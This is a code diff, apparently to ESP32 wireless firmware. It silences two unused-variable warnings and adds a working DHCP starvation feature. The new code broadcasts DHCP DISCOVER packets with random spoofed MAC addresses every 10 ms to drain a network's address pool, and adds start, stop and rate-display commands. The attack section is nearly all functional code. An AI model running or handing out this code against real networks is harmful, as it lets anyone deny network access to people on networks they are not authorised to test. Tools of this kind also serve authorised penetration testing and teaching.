@@ -2600,6 +2600,7 @@ void wifi_manager_start_ip_lookup() {
 
         int device_count = 0;
         struct DeviceInfo devices[MAX_DEVICES];
+        (void)devices;
 
         for (int s = 0; s < NUM_SERVICES; s++) {
             int retries = 0;
@@ -3029,6 +3030,8 @@ void wifi_manager_scanall_chart() {
             }
         }
 
+        (void)station_found_for_ap;
+
         // Print separator line below the AP (and its stations) if it's not the last AP
         if (i < ap_count - 1) {
             printf("%s\n", ap_separator);
@@ -3150,3 +3153,87 @@ static void wifi_beacon_list_task(void *param) {
     }
     vTaskDelete(NULL);
 }
+
+// Add DHCP starvation support start
+static volatile bool dhcp_starve_running = false;
+static volatile uint32_t dhcp_starve_packets_sent = 0;
+static TaskHandle_t dhcp_starve_task_handle = NULL;
+static TaskHandle_t dhcp_starve_display_task_handle = NULL;
+
+#pragma pack(push,1)
+typedef struct {
+    uint8_t op, htype, hlen, hops;
+    uint32_t xid;
+    uint16_t secs, flags;
+    uint32_t ciaddr, yiaddr, siaddr, giaddr;
+    uint8_t chaddr[16];
+    uint8_t sname[64];
+    uint8_t file[128];
+    uint8_t options[312];
+} dhcp_packet_t;
+#pragma pack(pop)
+
+static void dhcp_starve_task(void *param) {
+    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    int broadcast = 1;
+    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
+    struct sockaddr_in addr = { .sin_family = AF_INET, .sin_port = htons(67), .sin_addr.s_addr = htonl(INADDR_BROADCAST) };
+    while (dhcp_starve_running) {
+        dhcp_packet_t pkt;
+        memset(&pkt, 0, sizeof(pkt));
+        pkt.op = 1; pkt.htype = 1; pkt.hlen = 6;
+        pkt.xid = esp_random();
+        pkt.flags = htons(0x8000);
+        esp_fill_random(pkt.chaddr, 6);
+        pkt.chaddr[0] &= 0xFE; pkt.chaddr[0] |= 0x02;
+        pkt.options[0] = 99; pkt.options[1] = 130; pkt.options[2] = 83; pkt.options[3] = 99;
+        pkt.options[4] = 53; pkt.options[5] = 1; pkt.options[6] = 1; pkt.options[7] = 255;
+        sendto(sock, &pkt, sizeof(pkt), 0, (struct sockaddr*)&addr, sizeof(addr));
+        dhcp_starve_packets_sent++;
+        vTaskDelay(pdMS_TO_TICKS(10));
+    }
+    close(sock);
+    vTaskDelete(NULL);
+}
+
+static void dhcp_starve_display_task(void *param) {
+    uint32_t prev_total = 0;
+    while (dhcp_starve_running) {
+        vTaskDelay(pdMS_TO_TICKS(5000));
+        uint32_t total = dhcp_starve_packets_sent;
+        uint32_t interval = total - prev_total;
+        prev_total = total;
+        uint32_t pps = interval / 5;
+        printf("DHCP-Starve rate: %lu pps, Total: %lu packets\n", 
+               (unsigned long)pps, (unsigned long)total);
+    }
+    vTaskDelete(NULL);
+}
+
+void wifi_manager_start_dhcpstarve(int threads) {
+    if (dhcp_starve_running) {
+        printf("DHCP-Starve already running\n");
+        return;
+    }
+    dhcp_starve_running = true;
+    dhcp_starve_packets_sent = 0;
+    xTaskCreate(dhcp_starve_task, "dhcp_starve", 4096, NULL, 5, &dhcp_starve_task_handle);
+    xTaskCreate(dhcp_starve_display_task, "dhcp_disp", 2048, NULL, 5, &dhcp_starve_display_task_handle);
+}
+
+void wifi_manager_stop_dhcpstarve(void) {
+    if (!dhcp_starve_running) {
+        printf("DHCP-Starve not running\n");
+        return;
+    }
+    dhcp_starve_running = false;
+}
+
+void wifi_manager_dhcpstarve_display(void) {
+    printf("Packets sent so far: %lu\n", (unsigned long)dhcp_starve_packets_sent);
+}
+
+void wifi_manager_dhcpstarve_help(void) {
+    printf("Usage: dhcpstarve start [threads]\\n       dhcpstarve stop\\n       dhcpstarve display\\n");
+}
+// Add DHCP starvation support end
